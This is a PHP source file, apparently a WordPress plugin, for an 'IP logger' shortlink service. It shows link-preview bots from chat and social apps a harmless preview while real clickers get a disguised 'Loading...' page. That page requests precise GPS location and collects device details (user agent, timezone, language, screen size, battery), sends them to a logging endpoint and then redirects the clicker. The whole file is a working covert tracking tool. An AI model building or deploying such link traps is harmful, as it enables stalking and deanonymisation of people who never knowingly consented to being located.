<?php
// Exit if accessed directly
defined('ABSPATH') || exit;

// Register the /go/slug rewrite rule
add_action('init', function () {
    add_rewrite_rule('^go/([^/]*)/?', 'index.php?go_slug=$matches[1]', 'top');
});
add_filter('query_vars', function ($vars) {
    $vars[] = 'go_slug';
    return $vars;
});

// Handle the template redirect for our shortlink
add_action('template_redirect', function () {
    $slug = get_query_var('go_slug');
    if (!$slug) return;

    $slug = sanitize_title($slug);
    $links = get_option('iplogger_shortlinks', []);
    if (!isset($links[$slug])) {
        wp_die('Invalid short link.');
    }

    $link = $links[$slug];
    $destination_url = esc_url($link['url']);
    $page_url = esc_url(home_url('/wp-json/custom-logger/v1/log'));

    // Detect bots to show social media previews
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $isBot = strpos($ua, 'whatsapp') !== false || strpos($ua, 'facebook') !== false ||
             strpos($ua, 'discord') !== false || strpos($ua, 'telegram') !== false ||
             strpos($ua, 'slack') !== false || strpos($ua, 'preview') !== false;

    if ($isBot) {
        $title = esc_attr($link['title'] ?? 'Link Preview');
        $desc = htmlspecialchars(trim(strip_tags($link['description'] ?? '')), ENT_QUOTES, 'UTF-8');
        $desc = $desc ?: 'Click to view this awesome link!';
        $desc = mb_substr($desc, 0, 200);
        $image = esc_url($link['image'] ?? 'https://via.placeholder.com/800x420?text=Preview');
        $page_url_for_preview = esc_url(home_url("/go/{$slug}"));

        echo "<!DOCTYPE html><html><head>
            <meta charset='utf-8'>
            <title>{$title}</title>
            <meta property='og:title' content='{$title}' />
            <meta property='og:description' content='{$desc}' />
            <meta property='og:image' content='{$image}' />
            <meta property='og:url' content='{$page_url_for_preview}' />
            <meta name='twitter:card' content='summary_large_image' />
            <meta http-equiv='refresh' content='0;url={$destination_url}' />
        </head><body>Redirecting...</body></html>";
        exit;
    }

    $nonce = wp_create_nonce('wp_rest');

    // For real users, serve the JavaScript logger
    $script = <<<HTML
<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>
<script>
function sendAndRedirect(lat, lon, accType, accRadius) {
    const processData = (battery) => {
        const logData = {
            time: new Date().toISOString(),
            latitude: lat,
            longitude: lon,
            accuracyType: accType,
            accuracyRadius: accRadius,
            userAgent: navigator.userAgent,
            slug: "{$slug}",
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            screen: screen.width + "x" + screen.height,
            battery: battery ? Math.round(battery.level * 100) + "%" : "N/A",
            charging: battery ? (battery.charging ? "Yes" : "No") : "N/A"
        };

        // ✅ BUG FIX: Add a unique timestamp to the URL to prevent caching.
        const urlWithCacheBust = "{$page_url}?t=" + new Date().getTime();

        fetch(urlWithCacheBust, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-WP-Nonce": "{$nonce}"
            },
            body: JSON.stringify(logData)
        })
        .catch(error => {
            console.error("IP Logger Error:", error);
        })
        .finally(() => {
            window.location.href = "{$destination_url}";
        });
    };

    if (navigator.getBattery) {
        navigator.getBattery().then(processData);
    } else {
        processData(null);
    }
}

navigator.geolocation.getCurrentPosition(
    pos => {
        sendAndRedirect(pos.coords.latitude, pos.coords.longitude, "GPS", pos.coords.accuracy || "N/A");
    },
    err => {
        sendAndRedirect("N/A", "N/A", "Geo (Denied/Error)", "N/A");
    },
    { timeout: 5000, enableHighAccuracy: true }
);
</script>
</head>
<body><p>Please wait, you are being redirected...</p></body>
</html>
HTML;

    echo $script;
    exit;
});